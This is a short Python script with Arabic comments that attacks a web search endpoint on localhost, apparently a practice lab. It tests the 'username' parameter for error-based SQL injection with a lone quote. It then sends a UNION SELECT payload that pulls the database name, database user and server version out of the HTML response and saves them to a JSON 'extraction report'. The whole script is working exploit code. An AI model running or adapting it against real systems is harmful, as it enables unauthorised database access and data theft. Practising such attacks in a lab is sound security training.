import requests
import json
from datetime import datetime

URL = "http://127.0.0.1:5000/search"

def generate_report():
    report = {
        "target": URL,
        "scan_date": datetime.now().isoformat(),
        "vulnerabilities": [],
        "extracted_data": {}
    }
    
    # 1. كشف الحقن
    r = requests.get(URL, params={"username": "'"})
    if "error" in r.text.lower():
        report["vulnerabilities"].append({
            "parameter": "username",
            "type": "Error-Based SQL Injection",
            "severity": "Critical"
        })
    
    # 2. استخراج البيانات
    payload = "' UNION SELECT 1, database(), user(), version() -- "
    r = requests.get(URL, params={"username": payload})
    import re
    rows = re.findall(r'<td>(.*?)</td>', r.text)
    if rows:
        report["extracted_data"]["database"] = rows[1]
        report["extracted_data"]["db_user"] = rows[2]
        report["extracted_data"]["version"] = rows[3]
    
    # 3. حفظ التقرير
    with open("extraction_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print("📄 تم إنشاء التقرير: extraction_report.json")
    print(json.dumps(report, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    generate_report()